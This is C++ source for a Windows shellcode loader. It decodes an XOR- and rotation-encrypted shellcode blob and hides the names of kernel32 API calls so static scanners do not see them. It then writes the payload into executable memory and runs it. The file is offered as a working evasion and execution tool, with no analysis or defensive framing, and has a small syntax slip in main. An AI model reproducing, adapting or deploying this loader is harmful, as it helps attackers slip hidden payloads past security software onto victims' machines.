#include <Windows.h>
#include <iostream>



unsigned char circshift(unsigned char x, int n) {
	return (x >> n) | (x << (8 - n) & 0xFF);
}

void decode_shellcode(unsigned char shellcode[], int size, unsigned char key, unsigned char key2, int shift) {

	for (int x = 0; x < size; x++) {

		shellcode[x] = circshift((shellcode[x] ^ key), shift) ^ key2;
		//std::cout << (shellcode[x]);

	}



	return;

}

void decode_string(unsigned char* key, unsigned char* text, int size) {

	for (int x = 0; x < size; x++) {

		text[x] = text[x] ^ key[x];

	}

	return;
}

FARPROC load_func(LPCWSTR lib, LPCSTR function) {
	HMODULE hDLL = GetModuleHandle(L"kernel32");
	FARPROC x = GetProcAddress(hDLL, function);
	return x;
}

void exec(char* memory) {

	((void(*)())memory)();


}

void doShit() {

	HANDLE(WINAPI * OpenProcess)(DWORD, BOOL, DWORD);
	LPVOID(WINAPI * VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
	BOOL(WINAPI * WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);
	BOOL(WINAPI * CloseHandle)(HANDLE);

	unsigned char key = 232;
	unsigned char key2 = 148;
	int shift = 6;
	unsigned char shellcode[] = "\xbc\xe2\xdc\xbc\xce\xd4\x1f\x51\x51\x51\xbc\xcd\xef\x55\x51\x51\x51\xbc\x40\xb\xbe\x4d\x4d\xd4\xc4\x4b\x28\xbc\xe2\xb8\x67\xbc\xe5\x90\x51\x51\x51\x16\x93\x34\xac\xad\x74\xe8\xfe\x7b\x28\xb\xbe\x1d\x19\x84\xd0\xdf\x7c\x9e\xac\x1\xf9\x8d\xd6\xa9\xbc\x13\xac\xaf\xd9\xd2\xd6\xa9\xbc\x3\xac\xaf\xd1\xc0\xd6\x88\xc5\x99\x2c\x1e\x1\xa6\xd6\x7\x18\x20\xb1\x15\x52\x54\xcf\x43\x78\x7b\xcc\xe\x1d\x94\xb4\xf3\x53\x9f\xee\x19\x5f\x36\x50\x43\xca\x9b\xb1\x5f\xd\xe0\x26\x6b\xa\xb\xbe\x4d\x5f\xb5\xf4\x56\xf1\x19\xfe\x79\x59\x36\xd6\x4d\x39\xe9\xae\x45\x1f\x94\xf0\xb3\xbd\x19\x41\x3f\x1d\x36\xc9\x69\x3a\x4b\xb\x1e\x1\xa6\xd6\x7\x18\x20\xee\x3d\x3f\x97\x94\xb\x58\x5\x86\x10\x31\xc7\x4\x58\x21\x9\xef\x3\x39\x89\xf2\x5d\x39\xe9\xae\x44\x1f\x94\xf0\xd2\x78\xe9\xbd\x5f\x5c\x36\xd4\x4c\x7a\x4b\x8a\x1d\xaf\xd5\xe6\x59\x68\x3f\xee\x5b\x1d\xc2\x53\x1d\xbe\x5b\xa8\x1d\x1b\x84\x52\x59\xc8\x30\xb6\x1d\xd9\x2b\xfc\x5d\x78\x5d\x28\x5f\xaf\x50\xbe\x9e\xd7\xf4\x41\x1a\x1f\x7b\x19\x97\xa4\xdc\x72\xc1\x4d\xd4\x94\xde\x7a\x69\x7\x5f\x2d\xef\xec\xb\x28\xb\xec\x2f\x34\x86\xeb\xcb\x28\x4b\x50\x92\x4d\xd4\x84\x1b\x3d\x59\xdc\x74\x5e\xb6\xb8\x1b\x86\x18\x63\xc4\x8c\x2b\xb1\x58\x4a\xb1\xa4\xd\xd\xd4\xc4\x1d\x78\xa5\xf4\x6d\x97\xd4\x3b\x3e\x3c\x1f\xed\x1\x3f\x87\x88\x7b\x3a\xf4\x8e\x5f\x2f\x64\xd6\xb4\x18\x19\xdc\x3d\x1d\x7a\x7e\x88\xdf\x33\x41\x38\x5f\xb6\x35\xd1\x2c\x5b\xa8\x5e\x2f\x6c\xd6\x29\x56\x5b\x10\x2b\x24\xc9\x9c\xb4\x5d\x19\xde\x7c\x5d\x54\xc4\x4b\x7a\x25\x66\x16\x54\xd4\xc4\x4b\x28\xb\xee\x59\x1d\xc0\xd6\x29\x90\xde\x6b\x98\x1e\x98\xf4\xd1\x6b\x5d\xee\x59\xf5\xeb\x5d\xba\x39\x2\xab\xd\xd\xc6\xa7\x5a\x21\xd\xf\x4d\x57\xc6\xa6\xf2\xbd\x1f\xee\x59\x1d\xc0\x94\x5f\x7a\xf4\x8e\x1d\x59\x86\x3b\x79\x7b\x69\xce\x5e\x2f\xa4\x94\xe5\x76\x38\x71\xec\xb2\xa1\xd6\x7\x9c\x19\x41\xff\xaf\x57\x94\xe5\x2a\xea\xf9\x55\xb2\xa1\x2a\x73\x6f\x81\x3c\x1d\xe3\x7d\xa1\x24\x4f\xf4\xcb\x5f\xad\xe5\xce\x44\xa9\x14\x3c\x6d\xb3\xec\x99\xa\xc6\xda\x7a\xd1\x96\x4e\xc4\x1d\x78\x69\x8\xb2\x38\xd4\xc4\x4b\x28";
	unsigned char vallocx_key[] = "\xe8\xb0\x5d\x35\xbe\x25\x99\xa1\x8e\x25\xc2\xd7\xf9\x90";
	unsigned char open_proc_key[] = "\x94\x1c\x92\x5c\x6b\xa6\x29\xbd\x28\x51\xfb";
	unsigned char write_proc_key[] = "\x75\x8b\x7e\xf8\x62\x68\x2\xb0\x3f\x6a\x52\x36\xdc\x95\xc4\xff\xeb\x8e";
	unsigned char close_handle_key[] = "\x45\x43\x85\x91\x36\x1b\xd6\x4a\xc0\xcb\x6f";
	unsigned char kernel32_key[] = "\x27\xd9\x4f\x7\x59\x5e\xe8\x5";
	unsigned char vallocex[] = "\xbe\xd9\x2f\x41\xcb\x44\xf5\xe0\xe2\x49\xad\xb4\xbc\xe8";
	unsigned char openPRC[] = "\xdb\x6c\xf7\x32\x3b\xd4\x46\xde\x4d\x22\x88";
	unsigned char writePRC[] = "\x22\xf9\x17\x8c\x7\x38\x70\xdf\x5c\xf\x21\x45\x91\xf0\xa9\x90\x99\xf7";
	unsigned char closeHandle[] = "\x6\x2f\xea\xe2\x53\x53\xb7\x24\xa4\xa7\xa";
	unsigned char kernel32[] = "\x4c\xbc\x3d\x69\x3c\x32\xdb\x37";


	decode_string(vallocx_key, vallocex, sizeof vallocex);
	decode_string(open_proc_key, openPRC, sizeof openPRC);
	decode_string(write_proc_key, writePRC, sizeof writePRC);
	decode_string(close_handle_key, closeHandle, sizeof closeHandle);
	decode_string(kernel32_key, kernel32, sizeof kernel32);







	(FARPROC&)VirtualAllocEx = load_func((LPCWSTR)kernel32, (LPCSTR)vallocex);
	(FARPROC&)OpenProcess = load_func((LPCWSTR)kernel32, (LPCSTR)openPRC);
	(FARPROC&)WriteProcessMemory = load_func((LPCWSTR)kernel32, (LPCSTR)writePRC);
	//(FARPROC&)CreateRemoteThread = load_func((LPCWSTR)kernel32, (LPCSTR)rmthread);
	(FARPROC&)CloseHandle = load_func((LPCWSTR)kernel32, (LPCSTR)closeHandle);


	decode_shellcode(shellcode, sizeof shellcode, key2, key, shift);

	if (shellcode != NULL) {


		HANDLE processHandle = GetCurrentProcess();
		HANDLE remoteThread;
		LPVOID buffer;






		buffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

		if (buffer != 0x0 && buffer != NULL) {


			BOOL write = WriteProcessMemory(processHandle, buffer, shellcode, sizeof shellcode, NULL);

			if (write == TRUE) {

				std::cout << "\n[*] Written shellcode to memory";


				CloseHandle(processHandle);
				std::cout << "\n[*] Closed handle, triggering thread";

				char* char_ptr = static_cast<char*>(buffer);

				exec(char_ptr);


			}
			else {

				std::cout << "\n[*] An error has creating buffer..";

			}
		}


	}


}




int main()
{

	doShit()
	std::cout << "\n[*] Done";

	return 0;
}




